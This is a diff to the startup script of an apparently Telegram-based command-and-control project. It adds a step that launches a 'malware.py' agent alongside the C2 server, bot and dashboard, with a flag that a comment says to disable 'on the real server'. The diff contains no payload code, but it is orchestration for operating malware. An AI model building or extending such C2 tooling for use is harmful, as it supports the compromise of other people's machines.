@@ -4,6 +4,7 @@
 # ║                                                                          ║
 # ║  Usage:                                                                  ║
 # ║    ./start_all.sh                    # normal start                     ║
+# ║    START_MALWARE=false ./start_all.sh # server only — no local agent      ║
 # ║    FORCE_BUILD=true ./start_all.sh   # rebuild Next.js before start     ║
 # ║    DASHBOARD_KEY=mysecret ./start_all.sh                                ║
 # ╚══════════════════════════════════════════════════════════════════════════╝
@@ -36,6 +37,8 @@ export C2_SERVER_URL="${C2_SERVER_URL:-http://localhost:5000}"
 export BACKEND_URL="${BACKEND_URL:-http://localhost:8080}"
 export PYTHON_BIN="$PYTHON"          # used by dashboard/app.py for sub-process spawning
 FORCE_BUILD="${FORCE_BUILD:-false}"
+# تشغيل عميل التيليجرام المحلي (malware.py) على نفس الجهاز — عطّله على السيرفر الحقيقي
+START_MALWARE="${START_MALWARE:-true}"
 
 C2_PORT=5000
 DASH_PORT=8080
@@ -109,6 +112,7 @@ _kill() {
 
 _kill "c2_server.py"     "C2 Server"
 _kill "bot.py"           "Telegram Bot"
+_kill "malware.py"       "Malware agent"
 _kill "dashboard/app.py" "Flask Dashboard"
 _kill "next-server"      "Next.js"
 
@@ -153,7 +157,26 @@ fi
 sleep 1
 
 # ═════════════════════════════════════════════════════════════════════════
-# STEP 5 — Flask Dashboard  (port 8080)
+# STEP 5 — Malware agent (Telegram client — same machine as lab / demo)
+# ═════════════════════════════════════════════════════════════════════════
+section "Malware agent (optional)"
+
+MALWARE_SCRIPT="$PROJECT_DIR/malware.py"
+MALWARE_PID=0
+if [[ "${START_MALWARE}" != "true" ]] && [[ "${START_MALWARE}" != "1" ]] && [[ "${START_MALWARE}" != "yes" ]]; then
+    info "START_MALWARE=${START_MALWARE} — skipping local malware.py"
+elif [[ ! -f "$MALWARE_SCRIPT" ]]; then
+    warn "malware.py not found — skipping"
+else
+    nohup "$PYTHON" "$MALWARE_SCRIPT" > /tmp/c2_malware.log 2>&1 &
+    MALWARE_PID=$!
+    ok "Malware agent started  (PID ${MALWARE_PID})  →  /tmp/c2_malware.log"
+fi
+
+sleep 1
+
+# ═════════════════════════════════════════════════════════════════════════
+# STEP 6 — Flask Dashboard  (port 8080)
 # ═════════════════════════════════════════════════════════════════════════
 section "Starting Flask Dashboard  →  :${DASH_PORT}"
 
@@ -176,7 +199,7 @@ ok "Flask Dashboard started  (PID ${DASHBOARD_PID})  →  /tmp/dashboard.log"
 sleep 1
 
 # ═════════════════════════════════════════════════════════════════════════
-# STEP 6 — Next.js Frontend  (port 3000, PRODUCTION)
+# STEP 7 — Next.js Frontend  (port 3000, PRODUCTION)
 # ═════════════════════════════════════════════════════════════════════════
 section "Next.js Frontend  →  :${FRONT_PORT}  (production)"
 
@@ -235,6 +258,7 @@ cat > "$PID_FILE" << EOF
 # C2 Project PIDs — $(date)
 C2_PID=${C2_PID}
 BOT_PID=${BOT_PID}
+MALWARE_PID=${MALWARE_PID}
 DASHBOARD_PID=${DASHBOARD_PID}
 FRONTEND_PID=${FRONTEND_PID}
 EOF
@@ -258,6 +282,7 @@ _status() {
 
 _status "C2 Server       " "c2_server.py"
 _status "Telegram Bot    " "bot.py"
+_status "Malware agent   " "malware.py"
 _status "Flask Dashboard " "dashboard/app.py"
 _status "Next.js Frontend" "next-server"
 
@@ -268,7 +293,7 @@ printf "  ${CYAN}%-38s${NC} ${DIM}Flask API${NC}\n"                       "http:
 printf "  ${CYAN}%-38s${NC} ${DIM}C2 Server${NC}\n"                       "http://localhost:${C2_PORT}"
 
 echo -e "\n${BOLD}  Logs:${NC}"
-echo -e "  ${DIM}tail -f /tmp/c2_server.log /tmp/dashboard.log /tmp/frontend.log${NC}"
+echo -e "  ${DIM}tail -f /tmp/c2_server.log /tmp/c2_bot.log /tmp/c2_malware.log /tmp/dashboard.log /tmp/frontend.log${NC}"
 
 echo -e "\n${BOLD}  Management:${NC}"
 echo -e "  ${DIM}Stop all  :  ./stop_all.sh${NC}"
